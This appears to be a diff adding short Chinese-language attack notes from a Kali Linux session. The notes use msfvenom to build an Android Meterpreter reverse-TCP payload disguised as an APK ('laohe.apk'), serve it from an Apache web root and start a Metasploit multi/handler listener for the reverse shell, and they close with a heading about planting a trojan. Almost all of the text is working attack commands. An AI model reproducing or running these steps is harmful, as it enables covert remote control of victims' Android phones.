@@ -1,0 +1,19 @@
+攻击机
+msfvenom -p android/meterpreter/reverse_tcp LHOST=10.211.55.6 LPORT=4444 R > laohe.apk
+在msf中启动或者root启动都可以
+
+┌──(root💀kali-linux-2021-3)-[~]
+└─# cp laohe.apk /var/www/html       
+                                                                                                                                                                               
+┌──(root💀kali-linux-2021-3)-[~]
+└─# systemctl start apache2 
+
+msf6 > use exploit/multi/handler 
+msf6 exploit(multi/handler) > set payload android/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) > show options
+msf6 exploit(multi/handler) > set LHOST 10.211.55.6
+msf6 exploit(multi/handler) > run
+
+
+#############挂
+木马
